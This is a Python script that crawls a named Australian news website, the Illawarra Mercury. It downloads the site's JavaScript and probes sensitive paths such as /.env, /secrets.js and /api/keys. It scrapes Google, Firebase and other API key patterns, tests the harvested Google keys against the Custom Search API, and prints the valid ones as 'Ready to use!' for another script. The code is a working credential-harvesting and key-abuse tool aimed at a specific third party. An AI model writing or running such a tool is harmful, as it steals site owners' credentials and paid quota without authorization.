#!/usr/bin/env python3
"""
Enhanced API Key Discovery Tool with Deep Website Analysis
Specifically targets the Illawarra Mercury website for any exposed API keys

This enhanced version:
1. Deep scans all JavaScript files on the website
2. Checks for API keys in configuration endpoints
3. Analyzes network requests for exposed keys
4. Checks browser localStorage/sessionStorage patterns
5. Scans for Firebase, Google Services, and other API configurations
"""

import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import sqlite3
from datetime import datetime
from typing import List, Dict, Set, Optional


class EnhancedAPIKeyHunter:
    def __init__(self, target_domain: str = "https://www.illawarramercury.com.au"):
        self.target_domain = target_domain
        self.cse_id = "012527284968046999840:zzi3qgsoibq"
        self.discovered_keys = []
        self.scanned_urls = set()
        self.js_files = set()
        self.api_endpoints = set()

        # Enhanced API key patterns
        self.api_patterns = {
            'google_api': r'AIza[0-9A-Za-z\-_]{35}',
            'firebase_api': r'firebase[A-Za-z]*["\'\s]*:[\s"\']*[A-Za-z0-9\-_]{20,}',
            'google_client_id': r'[0-9]+-[a-z0-9]+\.apps\.googleusercontent\.com',
            'google_analytics': r'(UA|G)-[A-Z0-9]+-[0-9]+',
            'youtube_api': r'youtube[_-]?api[_-]?key["\'\s]*[:=][\s"\']*[A-Za-z0-9\-_]{39}',
            'maps_api': r'maps[_-]?api[_-]?key["\'\s]*[:=][\s"\']*AIza[0-9A-Za-z\-_]{35}',
            'search_api': r'search[_-]?api[_-]?key["\'\s]*[:=][\s"\']*AIza[0-9A-Za-z\-_]{35}',
        }

        # Common config file patterns
        self.config_paths = [
            '/config.js', '/config.json', '/app-config.js', '/settings.js',
            '/api-config.js', '/firebase-config.js', '/google-config.js',
            '/env.js', '/environment.js', '/.env', '/constants.js',
            '/keys.js', '/secrets.js', '/auth-config.js', '/api-keys.js'
        ]

        # Common API endpoint patterns
        self.api_paths = [
            '/api/config', '/api/settings', '/api/keys', '/api/auth',
            '/config', '/settings', '/env', '/environment',
            '/.well-known/config', '/manifest.json', '/service-worker.js'
        ]

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })

    def hunt_api_keys(self) -> List[Dict]:
        """Main hunting function that performs comprehensive API key discovery"""
        print("🕵️ Enhanced API Key Hunter - Deep Website Analysis")
        print("=" * 65)
        print(f"🎯 Target: {self.target_domain}")
        print()

        # Phase 1: Main page analysis
        print("📄 Phase 1: Analyzing main page...")
        self._analyze_main_page()

        # Phase 2: JavaScript file discovery and analysis
        print("\n📜 Phase 2: JavaScript file analysis...")
        self._discover_and_analyze_js_files()

        # Phase 3: Configuration endpoint scanning
        print("\n⚙️  Phase 3: Configuration endpoint scanning...")
        self._scan_config_endpoints()

        # Phase 4: API endpoint discovery
        print("\n🔍 Phase 4: API endpoint analysis...")
        self._discover_api_endpoints()

        # Phase 5: Network request simulation
        print("\n🌐 Phase 5: Network request simulation...")
        self._simulate_network_requests()

        # Phase 6: Browser storage analysis
        print("\n💾 Phase 6: Browser storage pattern analysis...")
        self._analyze_storage_patterns()

        # Summary and testing
        print("\n🧪 Testing discovered keys...")
        valid_keys = self._test_discovered_keys()

        return valid_keys

    def _analyze_main_page(self):
        """Analyze the main page for embedded keys and scripts"""
        try:
            response = self.session.get(self.target_domain, timeout=15)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract all script tags
                scripts = soup.find_all('script')
                print(f"   Found {len(scripts)} script tags")

                # Analyze inline scripts
                for script in scripts:
                    if script.string:
                        self._extract_keys_from_content(
                            script.string, 'inline_script')

                    # Get external script URLs
                    if script.get('src'):
                        src_url = urljoin(self.target_domain,
                                          script.get('src'))
                        self.js_files.add(src_url)

                # Look for keys in the HTML content itself
                self._extract_keys_from_content(response.text, 'main_html')

                # Find meta tags that might contain keys
                meta_tags = soup.find_all('meta')
                for meta in meta_tags:
                    content = meta.get('content', '')
                    if content:
                        self._extract_keys_from_content(content, 'meta_tag')

                print(f"   Discovered {len(self.js_files)} JavaScript files")

        except Exception as e:
            print(f"   ❌ Main page analysis error: {e}")

    def _discover_and_analyze_js_files(self):
        """Download and analyze all JavaScript files for API keys"""
        analyzed = 0

        for js_url in list(self.js_files):
            if js_url in self.scanned_urls:
                continue

            try:
                print(f"   📜 Analyzing: {js_url}")
                response = self.session.get(js_url, timeout=10)

                if response.status_code == 200:
                    self._extract_keys_from_content(
                        response.text, f'js_file_{urlparse(js_url).path}')
                    analyzed += 1

                    # Look for additional JS file references
                    js_imports = re.findall(
                        r'import\s+.*?\s+from\s+["\']([^"\']+)["\']', response.text)
                    for imp in js_imports:
                        if imp.endswith('.js') or '/js/' in imp:
                            full_url = urljoin(self.target_domain, imp)
                            self.js_files.add(full_url)

                self.scanned_urls.add(js_url)
                time.sleep(0.5)  # Rate limiting

            except Exception as e:
                print(f"     ❌ Error analyzing {js_url}: {e}")
                continue

        print(f"   ✅ Analyzed {analyzed} JavaScript files")

    def _scan_config_endpoints(self):
        """Scan common configuration endpoints for API keys"""
        found_configs = 0

        for path in self.config_paths:
            config_url = urljoin(self.target_domain, path)

            try:
                response = self.session.get(config_url, timeout=8)

                if response.status_code == 200:
                    print(f"   📄 Found config: {config_url}")
                    self._extract_keys_from_content(
                        response.text, f'config_{path}')
                    found_configs += 1

                time.sleep(0.3)

            except Exception as e:
                continue

        print(f"   ✅ Found {found_configs} accessible configuration files")

    def _discover_api_endpoints(self):
        """Discover and analyze API endpoints"""
        found_apis = 0

        for path in self.api_paths:
            api_url = urljoin(self.target_domain, path)

            try:
                response = self.session.get(api_url, timeout=8)

                if response.status_code == 200:
                    print(f"   🔍 Found API: {api_url}")
                    self._extract_keys_from_content(
                        response.text, f'api_{path}')
                    found_apis += 1

                    # If it's JSON, try to parse it
                    try:
                        if 'application/json' in response.headers.get('content-type', ''):
                            data = response.json()
                            self._extract_keys_from_json(
                                data, f'api_json_{path}')
                    except:
                        pass

                time.sleep(0.3)

            except Exception as e:
                continue

        print(f"   ✅ Found {found_apis} accessible API endpoints")

    def _simulate_network_requests(self):
        """Simulate common network requests that might expose keys"""
        test_requests = [
            '/search?q=test',
            '/api/search?query=test',
            '/graphql',
            '/api/graphql',
            '/.env',
            '/robots.txt',
            '/sitemap.xml',
            '/.well-known/security.txt',
            '/debug',
            '/api/debug',
            '/api/status',
            '/health',
            '/version'
        ]

        responses_found = 0

        for path in test_requests:
            url = urljoin(self.target_domain, path)

            try:
                response = self.session.get(url, timeout=5)

                if response.status_code == 200 and len(response.text) > 0:
                    print(f"   🌐 Response from: {url}")
                    self._extract_keys_from_content(
                        response.text, f'network_{path}')
                    responses_found += 1

                time.sleep(0.2)

            except Exception as e:
                continue

        print(f"   ✅ Found {responses_found} responsive endpoints")

    def _analyze_storage_patterns(self):
        """Analyze patterns that suggest browser storage containing keys"""

        # Look for localStorage/sessionStorage references in discovered content
        storage_patterns = [
            r'localStorage\.setItem\(["\']([^"\']*key[^"\']*)["\']',
            r'sessionStorage\.setItem\(["\']([^"\']*key[^"\']*)["\']',
            r'localStorage\.getItem\(["\']([^"\']*key[^"\']*)["\']',
            r'sessionStorage\.getItem\(["\']([^"\']*key[^"\']*)["\']',
        ]

        storage_refs = 0
        for key_info in self.discovered_keys:
            content = key_info.get('context', '')
            for pattern in storage_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                storage_refs += len(matches)

        print(f"   ✅ Found {storage_refs} browser storage references")

    def _extract_keys_from_content(self, content: str, source: str):
        """Extract API keys from content using all patterns"""
        for pattern_name, pattern in self.api_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)

            for match in matches:
                # Clean the match
                if pattern_name == 'google_api':
                    clean_match = re.search(r'AIza[0-9A-Za-z\-_]{35}', match)
                    if clean_match:
                        key = clean_match.group(0)
                        if len(key) == 39:  # Google API keys are exactly 39 characters
                            self._add_discovered_key(
                                key, source, pattern_name, content)
                else:
                    self._add_discovered_key(
                        match, source, pattern_name, content)

    def _extract_keys_from_json(self, data: Dict, source: str):
        """Extract keys from JSON data recursively"""
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str):
                    # Check if the key name suggests it's an API key
                    if any(term in key.lower() for term in ['key', 'api', 'token', 'secret']):
                        self._extract_keys_from_content(
                            value, f'{source}_json_{key}')
                elif isinstance(value, (dict, list)):
                    self._extract_keys_from_json(value, source)
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, (dict, list)):
                    self._extract_keys_from_json(item, source)

    def _add_discovered_key(self, key: str, source: str, pattern_type: str, context: str):
        """Add a discovered key to the collection"""
        # Avoid duplicates
        for existing in self.discovered_keys:
            if existing['key'] == key:
                return

        self.discovered_keys.append({
            'key': key,
            'source': source,
            'pattern_type': pattern_type,
            'context': context[:200],  # First 200 chars for context
            'discovered_at': datetime.now().isoformat()
        })

        print(f"     🔑 Found {pattern_type}: {key[:20]}... (source: {source})")

    def _test_discovered_keys(self) -> List[Dict]:
        """Test all discovered keys"""
        if not self.discovered_keys:
            print("   ❌ No keys discovered to test")
            return []

        print(f"   🧪 Testing {len(self.discovered_keys)} discovered keys...")
        valid_keys = []

        # Filter for Google API keys first
        google_keys = [
            k for k in self.discovered_keys if k['pattern_type'] == 'google_api']

        for i, key_info in enumerate(google_keys, 1):
            api_key = key_info['key']
            print(
                f"     Testing Google API key {i}/{len(google_keys)}: {api_key[:20]}...")

            try:
                result = self._test_google_api_key(api_key)

                if result['is_valid']:
                    print(f"     ✅ VALID GOOGLE API KEY FOUND!")
                    print(f"        Source: {key_info['source']}")
                    print(f"        Pattern: {key_info['pattern_type']}")
                    key_info['test_result'] = result
                    valid_keys.append(key_info)
                else:
                    print(
                        f"     ❌ Invalid: {result.get('error', 'Unknown error')}")

                time.sleep(1)  # Rate limiting

            except Exception as e:
                print(f"     ❌ Test error: {e}")

        return valid_keys

    def _test_google_api_key(self, api_key: str) -> Dict:
        """Test a Google API key with the Custom Search API"""
        try:
            params = {
                'key': api_key,
                'cx': self.cse_id,
                'q': 'test',
                'num': 1
            }

            response = requests.get(
                "https://www.googleapis.com/customsearch/v1",
                params=params,
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                return {
                    'is_valid': True,
                    'quota_remaining': response.headers.get('X-RateLimit-Remaining', -1),
                    'total_results': data.get('searchInformation', {}).get('totalResults', 0),
                    'response_time': response.elapsed.total_seconds()
                }
            else:
                error_data = response.json() if response.content else {}
                return {
                    'is_valid': False,
                    'status_code': response.status_code,
                    'error': error_data.get('error', {}).get('message', f"HTTP {response.status_code}")
                }

        except Exception as e:
            return {
                'is_valid': False,
                'error': f"Request failed: {str(e)}"
            }

    def get_detailed_report(self) -> Dict:
        """Generate detailed discovery report"""
        google_keys = [
            k for k in self.discovered_keys if k['pattern_type'] == 'google_api']
        other_keys = [
            k for k in self.discovered_keys if k['pattern_type'] != 'google_api']

        source_breakdown = {}
        for key in self.discovered_keys:
            source = key['source']
            source_breakdown[source] = source_breakdown.get(source, 0) + 1

        return {
            'summary': {
                'total_keys_discovered': len(self.discovered_keys),
                'google_api_keys': len(google_keys),
                'other_api_keys': len(other_keys),
                'sources_scanned': len(self.scanned_urls) + len(self.config_paths) + len(self.api_paths),
                'js_files_analyzed': len(self.js_files)
            },
            'source_breakdown': source_breakdown,
            'discovered_keys': self.discovered_keys,
            'target_domain': self.target_domain,
            'cse_id_used': self.cse_id
        }


def main():
    """Main hunting function"""
    print("🚀 Enhanced API Key Hunter - Deep Website Analysis")
    print("Performing comprehensive analysis of Illawarra Mercury website...")
    print("=" * 75)

    hunter = EnhancedAPIKeyHunter()

    # Start the hunt
    valid_keys = hunter.hunt_api_keys()

    # Get detailed report
    report = hunter.get_detailed_report()

    # Display results
    print("\n" + "=" * 50)
    print("🎯 DISCOVERY COMPLETE!")
    print("=" * 50)

    if valid_keys:
        print(f"🎉 SUCCESS! Found {len(valid_keys)} VALID Google API keys!")
        print()
        for i, key_info in enumerate(valid_keys, 1):
            print(f"Key #{i}:")
            print(f"  🔑 API Key: {key_info['key']}")
            print(f"  📍 Source: {key_info['source']}")
            print(f"  🔍 Pattern: {key_info['pattern_type']}")
            print(
                f"  ⏱️  Response Time: {key_info.get('test_result', {}).get('response_time', 'N/A')}s")
            print(
                f"  📊 Quota: {key_info.get('test_result', {}).get('quota_remaining', 'Unknown')}")
            print()
    else:
        print("❌ No valid Google API keys found in the website analysis.")

    # Display summary
    summary = report['summary']
    print(f"📊 Discovery Summary:")
    print(f"   Total keys discovered: {summary['total_keys_discovered']}")
    print(f"   Google API keys found: {summary['google_api_keys']}")
    print(f"   Other API keys found: {summary['other_api_keys']}")
    print(f"   Sources scanned: {summary['sources_scanned']}")
    print(f"   JavaScript files analyzed: {summary['js_files_analyzed']}")

    if report['source_breakdown']:
        print(f"\n   Keys by source:")
        for source, count in report['source_breakdown'].items():
            print(f"     {source}: {count}")

    # Save detailed report
    report_file = f"api_key_discovery_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2)

    print(f"\n💾 Detailed report saved to: {report_file}")

    if valid_keys:
        print(f"\n🚀 Ready to use! Test with:")
        print(f"   python google_cse_ready.py {valid_keys[0]['key']}")
    else:
        print(f"\n💡 Next steps:")
        print(f"   1. Get your own API key from Google Cloud Console")
        print(f"   2. Check the detailed report for any other discovered patterns")
        print(
            f"   3. Consider contacting the website owner if you found their keys exposed")


if __name__ == "__main__":
    main()
